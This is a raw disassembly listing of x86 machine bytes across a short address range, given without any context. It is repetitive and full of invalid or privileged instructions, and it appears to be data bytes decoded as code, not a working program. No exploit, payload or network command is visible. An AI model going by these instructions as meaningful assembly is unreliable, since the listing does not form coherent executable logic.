  41e2ce:	sub    al,0x2c
  41e2d0:	shr    BYTE PTR [eax+esi*1],1
  41e2d3:	xor    ah,cl
  41e2d5:	xor    BYTE PTR [esp+esi*1],dh
  41e2d8:	enter  0x3834,0x38
  41e2dc:	les    edi,FWORD PTR [eax]
  41e2de:	cmp    al,0x3c
  41e2e0:	sar    BYTE PTR [eax+eax*2],0x40
  41e2e4:	mov    esp,0xb2b2b240
  41e2e9:	inc    ebp
  41e2ea:	mov    esi,0xe49bebe
  41e2ef:	push   cs
  41e2f0:	push   cs
  41e2f1:	dec    ebp
  41e2f2:	adc    dl,BYTE PTR [edx]
  41e2f4:	adc    dl,BYTE PTR [ecx+0x16]
  41e2f7:	push   ss
  41e2f8:	push   ss
  41e2f9:	push   ebp
  41e2fa:	sbb    bl,BYTE PTR [edx]
  41e2fc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41e2ff:	push   ds
  41e300:	push   ds
  41e301:	pop    ebp
  41e302:	and    ah,BYTE PTR [edx]
  41e304:	and    ah,BYTE PTR [ecx+0x26]
  41e307:	es es sub ch,BYTE PTR gs:[edx]
  41e30c:	sub    ch,BYTE PTR [ecx+0x2e]
  41e30f:	cs cs ins DWORD PTR es:[edi],dx
  41e312:	xor    dh,BYTE PTR [edx]
  41e314:	xor    dh,BYTE PTR [ecx+0x36]
  41e317:	ss ss jne 0x41e355
  41e31b:	cmp    bh,BYTE PTR [edx]
  41e31d:	jns    0x41e35d
  41e31f:	ds ds jge 0x41e2e5
  41e323:	ret    0x81c2
  41e326:	mov    dh,0xc6
  41e329:	test   edx,ecx
  41e32b:	retf   0x89ca
  41e32e:	into   
  41e32f:	into   
  41e330:	into   
  41e331:	(bad)  
  41e332:	rcl    dl,cl
  41e334:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41e33a:	fcmovu st,st(2)
  41e33c:	ficomp DWORD PTR [ecx-0x62212122]
  41e342:	loop   0x41e326
  41e344:	loop   0x41e2e7
  41e346:	push   edx
  41e347:	push   edx
  41e348:	push   edx
  41e349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e34a:	pop    esi
  41e34b:	pop    esi
  41e34c:	pop    esi
  41e34d:	test   eax,0xac50acac
  41e352:	mov    al,0xb0
  41e354:	dec    esp
  41e355:	mov    al,0xb4
  41e357:	mov    ah,0x48
  41e359:	mov    ah,0xb8
  41e35b:	mov    eax,0xbcbcb844
  41e360:	inc    eax
  41e361:	mov    esp,0xc03cc0c0
  41e366:	xor    dh,BYTE PTR [edx]
  41e368:	xor    al,ch
  41e36a:	ds ds ds leave 
  41e36e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e374:	xchg   edx,eax
  41e375:	rcl    DWORD PTR [esi-0x652a696a],1
  41e37b:	call   0xdd9e:0x9e9ed99a
  41e382:	mov    ds:0xa6e1a2a2,al
  41e387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e389:	in     eax,0xaa
  41e38b:	stos   BYTE PTR es:[edi],al
  41e38c:	stos   BYTE PTR es:[edi],al
  41e38d:	jmp    0xedf09240
  41e392:	mov    dl,0xb2
  41e394:	mov    dl,0xf1
  41e396:	mov    dh,0xb6
  41e398:	mov    dh,0xf5
  41e39a:	mov    edx,0xbef9baba
  41e39f:	mov    esi,0x4242fdbe
  41e3a4:	inc    edx
  41e3a5:	add    DWORD PTR [esi+0x46],eax
  41e3a8:	inc    esi
  41e3a9:	add    eax,0x94a4a4a
  41e3ae:	dec    esi
  41e3af:	dec    esi
  41e3b0:	dec    esi
  41e3b1:	or     eax,0x11525252
  41e3b6:	push   esi
  41e3b7:	push   esi
  41e3b8:	push   esi
  41e3b9:	adc    eax,0x195a5a5a
  41e3be:	pop    esi
  41e3bf:	pop    esi
  41e3c0:	pop    esi
  41e3c1:	sbb    eax,0x21626262
  41e3c6:	rcl    dl,cl
  41e3c8:	shl    BYTE PTR ds:0x29dedede,cl
  41e3ce:	sub    al,0x2c
  41e3d0:	shr    BYTE PTR [eax+esi*1],1
  41e3d3:	xor    ah,cl
  41e3d5:	xor    BYTE PTR [esp+esi*1],dh
  41e3d8:	enter  0x3834,0x38
  41e3dc:	les    edi,FWORD PTR [eax]
  41e3de:	cmp    al,0x3c
  41e3e0:	sar    BYTE PTR [eax+eax*2],0x40
  41e3e4:	mov    esp,0xb2b2b240
  41e3e9:	inc    ebp
  41e3ea:	mov    esi,0xe49bebe
  41e3ef:	push   cs
  41e3f0:	push   cs
  41e3f1:	dec    ebp
  41e3f2:	adc    dl,BYTE PTR [edx]
  41e3f4:	adc    dl,BYTE PTR [ecx+0x16]
  41e3f7:	push   ss
  41e3f8:	push   ss
  41e3f9:	push   ebp
  41e3fa:	sbb    bl,BYTE PTR [edx]
  41e3fc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41e3ff:	push   ds
  41e400:	push   ds
  41e401:	pop    ebp
  41e402:	and    ah,BYTE PTR [edx]
  41e404:	and    ah,BYTE PTR [ecx+0x26]
  41e407:	es es sub ch,BYTE PTR gs:[edx]
  41e40c:	sub    ch,BYTE PTR [ecx+0x2e]
  41e40f:	cs cs ins DWORD PTR es:[edi],dx
  41e412:	xor    dh,BYTE PTR [edx]
  41e414:	xor    dh,BYTE PTR [ecx+0x36]
  41e417:	ss ss jne 0x41e455
  41e41b:	cmp    bh,BYTE PTR [edx]
  41e41d:	jns    0x41e45d
  41e41f:	ds ds jge 0x41e3e5
  41e423:	ret    0x81c2
  41e426:	mov    dh,0xc6
  41e429:	test   edx,ecx
  41e42b:	retf   0x89ca
  41e42e:	into   
  41e42f:	into   
  41e430:	into   
  41e431:	(bad)  
  41e432:	rcl    dl,cl
  41e434:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41e43a:	fcmovu st,st(2)
  41e43c:	ficomp DWORD PTR [ecx-0x62212122]
  41e442:	loop   0x41e426
  41e444:	loop   0x41e3e7
  41e446:	push   edx
  41e447:	push   edx
  41e448:	push   edx
  41e449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e44a:	pop    esi
  41e44b:	pop    esi
  41e44c:	pop    esi
  41e44d:	test   eax,0xac50acac
  41e452:	mov    al,0xb0
  41e454:	dec    esp
  41e455:	mov    al,0xb4
  41e457:	mov    ah,0x48
  41e459:	mov    ah,0xb8
  41e45b:	mov    eax,0xbcbcb844
  41e460:	inc    eax
  41e461:	mov    esp,0xc03cc0c0
  41e466:	xor    dh,BYTE PTR [edx]
  41e468:	xor    al,ch
  41e46a:	ds ds ds leave 
  41e46e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e474:	xchg   edx,eax
  41e475:	rcl    DWORD PTR [esi+0x29d59696],1
  41e47b:	sub    DWORD PTR [ecx+ebx*8],esi
  41e47e:	sub    eax,0x11dd302d
  41e483:	adc    DWORD PTR [ecx+eiz*8],ecx
  41e486:	adc    eax,0x19e50815
  41e48b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41e48e:	sbb    eax,0xb2ed001d
  41e493:	mov    dl,0xb2
  41e495:	icebp  
  41e496:	mov    dh,0xb6
  41e498:	mov    dh,0xf5
  41e49a:	mov    edx,0xbef9baba
  41e49f:	mov    esi,0xf1f1fdbe
  41e4a4:	in     al,dx
  41e4a5:	add    ebp,esi
  41e4a7:	cmc    
  41e4a8:	call   0xe53bddb2
  41e4ad:	or     ebp,edi
  41e4af:	std    
  41e4b0:	loopne 0x41e4bf
  41e4b2:	loope  0x41e495
  41e4b4:	cld    
  41e4b5:	adc    ebp,esp
  41e4b7:	in     eax,0xf8
  41e4b9:	adc    eax,0x195a5a5a
  41e4be:	pop    esi
  41e4bf:	pop    esi
  41e4c0:	pop    esi
  41e4c1:	sbb    eax,0x21626262
  41e4c6:	rcl    dl,cl
  41e4c8:	shl    BYTE PTR ds:0x29dedede,cl
  41e4ce:	sub    al,0x2c
  41e4d0:	shr    BYTE PTR [eax+esi*1],1
  41e4d3:	xor    ah,cl
  41e4d5:	xor    BYTE PTR [esp+esi*1],dh
  41e4d8:	enter  0x3834,0x38
  41e4dc:	les    edi,FWORD PTR [eax]
  41e4de:	cmp    al,0x3c
  41e4e0:	sar    BYTE PTR [eax+eax*2],0x40
  41e4e4:	mov    esp,0xb2b2b240
  41e4e9:	inc    ebp
  41e4ea:	mov    esi,0xe49bebe
  41e4ef:	push   cs
  41e4f0:	push   cs
  41e4f1:	dec    ebp
  41e4f2:	adc    dl,BYTE PTR [edx]
  41e4f4:	adc    dl,BYTE PTR [ecx+0x16]
  41e4f7:	push   ss
  41e4f8:	push   ss
  41e4f9:	push   ebp
  41e4fa:	test   eax,0xad59b4a9
  41e4ff:	lods   eax,DWORD PTR ds:[esi]
  41e500:	mov    al,0x5d
  41e502:	xchg   ecx,eax
  41e503:	xchg   ecx,eax
  41e504:	mov    WORD PTR [ecx-0x6b],fs
  41e507:	xchg   ebp,eax
  41e508:	mov    BYTE PTR [ebp-0x67],ah
  41e50b:	cdq    
  41e50c:	test   BYTE PTR [ecx-0x63],ch
  41e50f:	popf   
  41e510:	sub    BYTE PTR [ebp+0x32],0x32
  41e514:	xor    dh,BYTE PTR [ecx+0x36]
  41e517:	ss ss jne 0x41e555
  41e51b:	cmp    bh,BYTE PTR [edx]
  41e51d:	jns    0x41e55d
  41e51f:	ds ds jge 0x41e594
  41e523:	jno    0x41e591
  41e525:	xor    DWORD PTR [ebp+0x75],0x79798568
  41e52c:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41e530:	pusha  
  41e531:	lea    esp,[ecx+0x61]
  41e534:	jl     0x41e4c7
  41e536:	gs gs js 0x41e4cf
  41e53a:	fcmovu st,st(2)
  41e53c:	ficomp DWORD PTR [ecx-0x62212122]
  41e542:	loop   0x41e526
  41e544:	loop   0x41e4e7
  41e546:	push   edx
  41e547:	push   edx
  41e548:	push   edx
  41e549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e54a:	pop    esi
  41e54b:	pop    esi
  41e54c:	pop    esi
  41e54d:	test   eax,0xac50acac
  41e552:	mov    al,0xb0
  41e554:	dec    esp
  41e555:	mov    al,0xb4
  41e557:	mov    ah,0x48
  41e559:	mov    ah,0xb8
  41e55b:	mov    eax,0xbcbcb844
  41e560:	inc    eax
  41e561:	mov    esp,0xc03cc0c0
  41e566:	xor    dh,BYTE PTR [edx]
  41e568:	xor    al,ch
  41e56a:	ds ds ds leave 
  41e56e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e574:	xchg   edx,eax
  41e575:	rcl    DWORD PTR [esi+0x29d59696],1
  41e57b:	sub    DWORD PTR [ecx+ebx*8],esi
  41e57e:	sub    eax,0x11dd302d
  41e583:	adc    DWORD PTR [ecx+eiz*8],ecx
  41e586:	adc    eax,0x19e50815
  41e58b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41e58e:	sbb    eax,0xb2ed001d
  41e593:	mov    dl,0xb2
  41e595:	icebp  
  41e596:	mov    dh,0xb6
  41e598:	mov    dh,0xf5
  41e59a:	mov    edx,0xbef9baba
  41e59f:	mov    esi,0xf1f1fdbe
  41e5a4:	in     al,dx
  41e5a5:	add    ebp,esi
  41e5a7:	cmc    
  41e5a8:	call   0xe53bdeb2
  41e5ad:	or     ebp,edi
  41e5af:	std    
  41e5b0:	loopne 0x41e5bf
  41e5b2:	loope  0x41e595
  41e5b4:	cld    
  41e5b5:	adc    ebp,esp
  41e5b7:	in     eax,0xf8
  41e5b9:	adc    eax,0x195a5a5a
  41e5be:	pop    esi
  41e5bf:	pop    esi
  41e5c0:	pop    esi
  41e5c1:	sbb    eax,0x21626262
  41e5c6:	rcl    dl,cl
  41e5c8:	shl    BYTE PTR ds:0x29dedede,cl
  41e5ce:	sub    al,0x2c
  41e5d0:	shr    BYTE PTR [eax+esi*1],1
  41e5d3:	xor    ah,cl
  41e5d5:	xor    BYTE PTR [esp+esi*1],dh
  41e5d8:	enter  0x3834,0x38
  41e5dc:	les    edi,FWORD PTR [eax]
  41e5de:	cmp    al,0x3c
  41e5e0:	sar    BYTE PTR [eax+eax*2],0x40
  41e5e4:	mov    esp,0xb2b2b240
  41e5e9:	inc    ebp
  41e5ea:	mov    esi,0xe49bebe
  41e5ef:	push   cs
  41e5f0:	push   cs
  41e5f1:	dec    ebp
  41e5f2:	adc    dl,BYTE PTR [edx]
  41e5f4:	adc    dl,BYTE PTR [ecx+0x16]
  41e5f7:	push   ss
  41e5f8:	push   ss
  41e5f9:	push   ebp
  41e5fa:	test   eax,0xad59b4a9
  41e5ff:	lods   eax,DWORD PTR ds:[esi]
  41e600:	mov    al,0x5d
  41e602:	xchg   ecx,eax
  41e603:	xchg   ecx,eax
  41e604:	mov    WORD PTR [ecx-0x6b],fs
  41e607:	xchg   ebp,eax
  41e608:	mov    BYTE PTR [ebp-0x67],ah
  41e60b:	cdq    
  41e60c:	test   BYTE PTR [ecx-0x63],ch
  41e60f:	popf   
  41e610:	sub    BYTE PTR [ebp+0x32],0x32
  41e614:	xor    dh,BYTE PTR [ecx+0x36]
  41e617:	ss ss jne 0x41e655
  41e61b:	cmp    bh,BYTE PTR [edx]
  41e61d:	jns    0x41e65d
  41e61f:	ds ds jge 0x41e694
  41e623:	jno    0x41e691
  41e625:	xor    DWORD PTR [ebp+0x75],0x79798568
  41e62c:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41e630:	pusha  
  41e631:	lea    esp,[ecx+0x61]
  41e634:	jl     0x41e5c7
  41e636:	gs gs js 0x41e5cf
  41e63a:	fcmovu st,st(2)
  41e63c:	ficomp DWORD PTR [ecx-0x62212122]
  41e642:	loop   0x41e626
  41e644:	loop   0x41e5e7
  41e646:	push   edx
  41e647:	push   edx
  41e648:	push   edx
  41e649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e64a:	pop    esi
  41e64b:	pop    esi
  41e64c:	pop    esi
  41e64d:	test   eax,0xac50acac
  41e652:	mov    al,0xb0
  41e654:	dec    esp
  41e655:	mov    al,0xb4
  41e657:	mov    ah,0x48
  41e659:	mov    ah,0xb8
  41e65b:	mov    eax,0xbcbcb844
  41e660:	inc    eax
  41e661:	mov    esp,0xc03cc0c0
  41e666:	xor    dh,BYTE PTR [edx]
  41e668:	xor    al,ch
  41e66a:	ds ds ds leave 
  41e66e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e674:	xchg   edx,eax
  41e675:	rcl    DWORD PTR [esi+0x29d59696],1
  41e67b:	sub    DWORD PTR [ecx+ebx*8],esi
  41e67e:	sub    eax,0x11dd302d
  41e683:	adc    DWORD PTR [ecx+eiz*8],ecx
  41e686:	adc    eax,0x19e50815
  41e68b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41e68e:	sbb    eax,0xb2ed001d
  41e693:	mov    dl,0xb2
  41e695:	icebp  
  41e696:	mov    dh,0xb6
  41e698:	mov    dh,0xf5
  41e69a:	mov    edx,0xbef9baba
  41e69f:	mov    esi,0xf1f1fdbe
  41e6a4:	in     al,dx
  41e6a5:	add    ebp,esi
  41e6a7:	cmc    
  41e6a8:	call   0xe53bdfb2
  41e6ad:	or     ebp,edi
  41e6af:	std    
  41e6b0:	loopne 0x41e6bf
  41e6b2:	loope  0x41e695
  41e6b4:	cld    
  41e6b5:	adc    ebp,esp
  41e6b7:	in     eax,0xf8
  41e6b9:	adc    eax,0x195a5a5a
  41e6be:	pop    esi
  41e6bf:	pop    esi
  41e6c0:	pop    esi
  41e6c1:	sbb    eax,0x21626262
  41e6c6:	rcl    dl,cl
  41e6c8:	shl    BYTE PTR ds:0x29dedede,cl
  41e6ce:	sub    al,0x2c
  41e6d0:	shr    BYTE PTR [eax+esi*1],1
  41e6d3:	xor    ah,cl
  41e6d5:	xor    BYTE PTR [esp+esi*1],dh
  41e6d8:	enter  0x3834,0x38
  41e6dc:	les    edi,FWORD PTR [eax]
  41e6de:	cmp    al,0x3c
  41e6e0:	sar    BYTE PTR [eax+eax*2],0x40
  41e6e4:	mov    esp,0xb2b2b240
  41e6e9:	inc    ebp
  41e6ea:	mov    esi,0xe49bebe
  41e6ef:	push   cs
  41e6f0:	push   cs
  41e6f1:	dec    ebp
  41e6f2:	adc    dl,BYTE PTR [edx]
  41e6f4:	adc    dl,BYTE PTR [ecx+0x16]
  41e6f7:	push   ss
  41e6f8:	push   ss
  41e6f9:	push   ebp
  41e6fa:	test   eax,0xad59b4a9
  41e6ff:	lods   eax,DWORD PTR ds:[esi]
  41e700:	mov    al,0x5d
  41e702:	xchg   ecx,eax
  41e703:	xchg   ecx,eax
  41e704:	mov    WORD PTR [ecx-0x6b],fs
  41e707:	xchg   ebp,eax
  41e708:	mov    BYTE PTR [ebp-0x67],ah
  41e70b:	cdq    
  41e70c:	test   BYTE PTR [ecx-0x63],ch
  41e70f:	popf   
  41e710:	sub    BYTE PTR [ebp+0x32],0x32
  41e714:	xor    dh,BYTE PTR [ecx+0x36]
  41e717:	ss ss jne 0x41e755
  41e71b:	cmp    bh,BYTE PTR [edx]
  41e71d:	jns    0x41e75d
  41e71f:	ds ds jge 0x41e794
  41e723:	jno    0x41e791
  41e725:	xor    DWORD PTR [ebp+0x75],0x79798568
  41e72c:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41e730:	pusha  
  41e731:	lea    esp,[ecx+0x61]
  41e734:	jl     0x41e6c7
  41e736:	gs gs js 0x41e6cf
  41e73a:	fcmovu st,st(2)
  41e73c:	ficomp DWORD PTR [ecx-0x62212122]
  41e742:	loop   0x41e726
  41e744:	loop   0x41e6e7
  41e746:	push   edx
  41e747:	push   edx
  41e748:	push   edx
  41e749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e74a:	pop    esi
  41e74b:	pop    esi
  41e74c:	pop    esi
  41e74d:	test   eax,0xac50acac
  41e752:	mov    al,0xb0
  41e754:	dec    esp
  41e755:	mov    al,0xb4
  41e757:	mov    ah,0x48
  41e759:	mov    ah,0xb8
  41e75b:	mov    eax,0xbcbcb844
  41e760:	inc    eax
  41e761:	mov    esp,0xc03cc0c0
  41e766:	xor    dh,BYTE PTR [edx]
  41e768:	xor    al,ch
  41e76a:	ds ds ds leave 
  41e76e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e774:	xchg   edx,eax
  41e775:	rcl    DWORD PTR [esi-0x652a696a],1
  41e77b:	call   0xdd9e:0x9e9ed99a
  41e782:	mov    ds:0xa6e1a2a2,al
  41e787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e789:	in     eax,0xaa
  41e78b:	stos   BYTE PTR es:[edi],al
  41e78c:	stos   BYTE PTR es:[edi],al
  41e78d:	jmp    0xedf09640
  41e792:	mov    dl,0xb2
  41e794:	mov    dl,0xf1
  41e796:	mov    dh,0xb6
  41e798:	mov    dh,0xf5
  41e79a:	mov    edx,0xbef9baba
  41e79f:	mov    esi,0x4242fdbe
  41e7a4:	inc    edx
  41e7a5:	add    DWORD PTR [esi+0x46],eax
  41e7a8:	inc    esi
  41e7a9:	add    eax,0x94a4a4a
  41e7ae:	dec    esi
  41e7af:	dec    esi
  41e7b0:	dec    esi
  41e7b1:	or     eax,0x11525252
  41e7b6:	push   esi
  41e7b7:	push   esi
  41e7b8:	push   esi
  41e7b9:	adc    eax,0x195a5a5a
  41e7be:	pop    esi
  41e7bf:	pop    esi
  41e7c0:	pop    esi
  41e7c1:	sbb    eax,0x21626262
  41e7c6:	rcl    dl,cl
  41e7c8:	shl    BYTE PTR ds:0x29dedede,cl
  41e7ce:	sub    al,0x2c
  41e7d0:	shr    BYTE PTR [eax+esi*1],1
  41e7d3:	xor    ah,cl
  41e7d5:	xor    BYTE PTR [esp+esi*1],dh
  41e7d8:	enter  0x3834,0x38
  41e7dc:	les    edi,FWORD PTR [eax]
  41e7de:	cmp    al,0x3c
  41e7e0:	sar    BYTE PTR [eax+eax*2],0x40
  41e7e4:	mov    esp,0xb2b2b240
  41e7e9:	inc    ebp
  41e7ea:	mov    esi,0xe49bebe
  41e7ef:	push   cs
  41e7f0:	push   cs
  41e7f1:	dec    ebp
  41e7f2:	adc    dl,BYTE PTR [edx]
  41e7f4:	adc    dl,BYTE PTR [ecx+0x16]
  41e7f7:	push   ss
  41e7f8:	push   ss
  41e7f9:	push   ebp
  41e7fa:	sbb    bl,BYTE PTR [edx]
  41e7fc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41e7ff:	push   ds
  41e800:	push   ds
  41e801:	pop    ebp
  41e802:	and    ah,BYTE PTR [edx]
  41e804:	and    ah,BYTE PTR [ecx+0x26]
  41e807:	es es sub ch,BYTE PTR gs:[edx]
  41e80c:	sub    ch,BYTE PTR [ecx+0x2e]
  41e80f:	cs cs ins DWORD PTR es:[edi],dx
  41e812:	xor    dh,BYTE PTR [edx]
  41e814:	xor    dh,BYTE PTR [ecx+0x36]
  41e817:	ss ss jne 0x41e855
  41e81b:	cmp    bh,BYTE PTR [edx]
  41e81d:	jns    0x41e85d
  41e81f:	ds ds jge 0x41e7e5
  41e823:	ret    0x81c2
  41e826:	mov    dh,0xc6
  41e829:	test   edx,ecx
  41e82b:	retf   0x89ca
  41e82e:	into   
  41e82f:	into   
  41e830:	into   
  41e831:	(bad)  
  41e832:	rcl    dl,cl
  41e834:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41e83a:	fcmovu st,st(2)
  41e83c:	ficomp DWORD PTR [ecx-0x62212122]
  41e842:	loop   0x41e826
  41e844:	loop   0x41e7e7
  41e846:	push   edx
  41e847:	push   edx
  41e848:	push   edx
  41e849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e84a:	pop    esi
  41e84b:	pop    esi
  41e84c:	pop    esi
  41e84d:	test   eax,0xac50acac
  41e852:	mov    al,0xb0
  41e854:	dec    esp
  41e855:	mov    al,0xb4
  41e857:	mov    ah,0x48
  41e859:	mov    ah,0xb8
  41e85b:	mov    eax,0xbcbcb844
  41e860:	inc    eax
  41e861:	mov    esp,0xc03cc0c0
  41e866:	xor    dh,BYTE PTR [edx]
  41e868:	xor    al,ch
  41e86a:	ds ds ds leave 
  41e86e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e874:	xchg   edx,eax
  41e875:	rcl    DWORD PTR [esi-0x652a696a],1
  41e87b:	call   0xdd9e:0x9e9ed99a
  41e882:	mov    ds:0xa6e1a2a2,al
  41e887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e889:	in     eax,0xaa
  41e88b:	stos   BYTE PTR es:[edi],al
  41e88c:	stos   BYTE PTR es:[edi],al
  41e88d:	jmp    0xedf09740
  41e892:	mov    dl,0xb2
  41e894:	mov    dl,0xf1
  41e896:	mov    dh,0xb6
  41e898:	mov    dh,0xf5
  41e89a:	mov    edx,0xbef9baba
  41e89f:	mov    esi,0x4242fdbe
  41e8a4:	inc    edx
  41e8a5:	add    DWORD PTR [esi+0x46],eax
  41e8a8:	inc    esi
  41e8a9:	add    eax,0x94a4a4a
  41e8ae:	dec    esi
  41e8af:	dec    esi
  41e8b0:	dec    esi
  41e8b1:	or     eax,0x11525252
  41e8b6:	push   esi
  41e8b7:	push   esi
  41e8b8:	push   esi
  41e8b9:	adc    eax,0x195a5a5a
  41e8be:	pop    esi
  41e8bf:	pop    esi
  41e8c0:	pop    esi
  41e8c1:	sbb    eax,0x21626262
  41e8c6:	rcl    dl,cl
  41e8c8:	shl    BYTE PTR ds:0x29dedede,cl
  41e8ce:	sub    al,0x2c
  41e8d0:	shr    BYTE PTR [eax+esi*1],1
  41e8d3:	xor    ah,cl
  41e8d5:	xor    BYTE PTR [esp+esi*1],dh
  41e8d8:	enter  0x3834,0x38
  41e8dc:	les    edi,FWORD PTR [eax]
  41e8de:	cmp    al,0x3c
  41e8e0:	sar    BYTE PTR [eax+eax*2],0x40
  41e8e4:	mov    esp,0xb2b2b240
  41e8e9:	inc    ebp
  41e8ea:	mov    esi,0xba49bebe
  41e8ef:	mov    edx,0xa6a64dba
  41e8f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8f5:	push   ecx
  41e8f6:	mov    ds:0xae55a2a2,al
  41e8fb:	scas   al,BYTE PTR es:[edi]
  41e8fc:	scas   al,BYTE PTR es:[edi]
  41e8fd:	pop    ecx
  41e8fe:	mov    BYTE PTR [eax+0x4045d8c],cl
  41e904:	add    BYTE PTR [ecx+0x26],ah
  41e907:	es es sub ch,BYTE PTR gs:[edx]
  41e90c:	sub    ch,BYTE PTR [ecx+0x2e]
  41e90f:	cs cs ins DWORD PTR es:[edi],dx
  41e912:	xor    dh,BYTE PTR [edx]
  41e914:	xor    dh,BYTE PTR [ecx+0x36]
  41e917:	ss ss jne 0x41e955
  41e91b:	cmp    bh,BYTE PTR [edx]
  41e91d:	jns    0x41e95d
  41e91f:	ds ds jge 0x41e8e5
  41e923:	ret    0x81c2
  41e926:	mov    dh,0xc6
  41e929:	test   edx,ecx
  41e92b:	retf   0x89ca
  41e92e:	call   0x44cfd61b
  41e933:	inc    esp
  41e934:	inc    eax
  41e935:	xchg   ecx,eax
  41e936:	bound  esp,QWORD PTR [edx+0x62]
  41e939:	xchg   ebp,eax
  41e93a:	outs   dx,BYTE PTR ds:[esi]
  41e93b:	outs   dx,BYTE PTR ds:[esi]
  41e93c:	outs   dx,BYTE PTR ds:[esi]
  41e93d:	cdq    
  41e93e:	push   0x6a
  41e940:	push   0xffffff9d
  41e942:	push   esi
  41e943:	push   esi
  41e944:	push   esi
  41e945:	mov    eax,ds:0xa5525252
  41e94a:	pop    esi
  41e94b:	pop    esi
  41e94c:	pop    esi
  41e94d:	test   eax,0xac50acac
  41e952:	mov    al,0xb0
  41e954:	dec    esp
  41e955:	mov    al,0xb4
  41e957:	mov    ah,0x48
  41e959:	mov    ah,0xb8
  41e95b:	mov    eax,0xbcbcb844
  41e960:	inc    eax
  41e961:	mov    esp,0xc03cc0c0
  41e966:	xor    dh,BYTE PTR [edx]
  41e968:	xor    al,ch
  41e96a:	ds ds ds leave 
  41e96e:	cmp    bh,BYTE PTR [edx]
  41e970:	cmp    cl,ch
  41e972:	es es shl DWORD PTR es:[edx],1
  41e977:	and    ah,BYTE PTR [edx]
  41e979:	aad    0x44
  41e97b:	inc    esp
  41e97c:	inc    eax
  41e97d:	fstp   DWORD PTR [esi-0x5d226162]
  41e983:	mov    ds:0xa6a6e1a2,al
  41e988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e989:	in     eax,0xaa
  41e98b:	stos   BYTE PTR es:[edi],al
  41e98c:	stos   BYTE PTR es:[edi],al
  41e98d:	jmp    0xedf09840
  41e992:	mov    dl,0xb2
  41e994:	mov    dl,0xf1
  41e996:	mov    dh,0xb6
  41e998:	mov    dh,0xf5
  41e99a:	mov    edx,0xbef9baba
  41e99f:	mov    esi,0x4242fdbe
  41e9a4:	inc    edx
  41e9a5:	add    DWORD PTR [esi+0x46],eax
  41e9a8:	inc    esi
  41e9a9:	add    eax,0x94a4a4a
  41e9ae:	dec    esi
  41e9af:	dec    esi
  41e9b0:	dec    esi
  41e9b1:	or     eax,0x11525252
  41e9b6:	mov    BYTE PTR [eax-0x1111ea74],cl
  41e9bc:	out    dx,al
  41e9bd:	sbb    edx,ebp
  41e9bf:	jmp    0x21d6:0xd6d61dea
  41e9c6:	rcl    dl,cl
  41e9c8:	shl    BYTE PTR ds:0x29dedede,cl
  41e9ce:	sub    al,0x2c
  41e9d0:	shr    BYTE PTR [eax+esi*1],1
  41e9d3:	xor    ah,cl
  41e9d5:	xor    BYTE PTR [esp+esi*1],dh
  41e9d8:	enter  0x3834,0x38
  41e9dc:	les    edi,FWORD PTR [eax]
  41e9de:	cmp    al,0x3c
  41e9e0:	sar    BYTE PTR [eax+eax*2],0x40
  41e9e4:	mov    esp,0xb0bcbc40
  41e9e9:	inc    ebp
  41e9ea:	mov    esi,0xba49bebe
  41e9ef:	mov    edx,0x84844dba
  41e9f4:	adc    BYTE PTR [ecx+0x30],0x30
  41e9f8:	xor    al,0x55
  41e9fa:	sbb    bl,BYTE PTR [edx]
  41e9fc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41e9ff:	push   ds
  41ea00:	push   ds
  41ea01:	pop    ebp
  41ea02:	and    ah,BYTE PTR [edx]
  41ea04:	and    ah,BYTE PTR [ecx+0x26]
  41ea07:	es es sub ch,BYTE PTR gs:[edx]
  41ea0c:	sub    ch,BYTE PTR [ecx+0x2e]
  41ea0f:	cs cs ins DWORD PTR es:[edi],dx
  41ea12:	xor    dh,BYTE PTR [edx]
  41ea14:	xor    dh,BYTE PTR [ecx+0x2d]
  41ea17:	das    
  41ea18:	and    DWORD PTR [ebp+0x21],esi
  41ea1b:	and    ebp,DWORD PTR ds:0x3e3e3e79
  41ea21:	jge    0x41e9e5
  41ea23:	ret    0x81c2
  41ea26:	mov    dh,0xc6
  41ea29:	test   edx,ecx
  41ea2b:	retf   0x89ca
  41ea2e:	into   
  41ea2f:	into   
  41ea30:	into   
  41ea31:	(bad)  
  41ea32:	rcl    dl,cl
  41ea34:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41ea3a:	cld    
  41ea3b:	cld    
  41ea3c:	clc    
  41ea3d:	cdq    
  41ea3e:	dec    eax
  41ea3f:	dec    eax
  41ea40:	dec    esp
  41ea41:	popf   
  41ea42:	push   esi
  41ea43:	push   esi
  41ea44:	push   esi
  41ea45:	mov    eax,ds:0xa5525252
  41ea4a:	push   eax
  41ea4b:	push   eax
  41ea4c:	pop    esp
